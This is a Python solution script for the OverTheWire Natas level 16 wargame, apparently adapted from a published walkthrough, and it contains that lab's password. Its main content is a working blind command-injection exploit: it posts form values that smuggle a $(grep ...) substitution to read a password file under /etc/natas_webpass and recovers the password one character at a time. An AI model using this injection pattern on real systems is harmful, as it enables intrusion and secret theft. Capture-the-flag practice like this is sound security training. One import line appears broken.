#!/usr/bin/env python3
'''
Level 16 → Level 17
Blind Grep & RCE

github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas16.py
www.youtube.com/watch?v=6XlDsn-R5oQ&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=14



https://www.youtube.com/watch?v=vz3XVCPBSbA

Username: natas16
URL:      http://natas16.natas.labs.overthewire.org
password:   WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
problem:

write up:



Manual Mode


'''
import string

import requests
import re
from string import *

#characters = lowercase + uppercase + digits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
print(characters)

from pyodbc import lowercase

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

# response = session.post(url, data = { "needle" : "anythings$(grep 8 /etc/natas_webpass/natas17 > dictionary.txt)" },auth = (username, password) )
# content = response.text

# print content


seen_password = list()
while ( len(seen_password) < 32 ):

    for character in characters:
        print ("".join(seen_password) + character)
        response = session.post(url, data = { "needle" : "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" },auth = (username, password) )
        content = response.text


        returned = re.findall( '<pre>\n(.*)\n</pre>', content )

        if ( not returned ):
            seen_password.append( character )
            break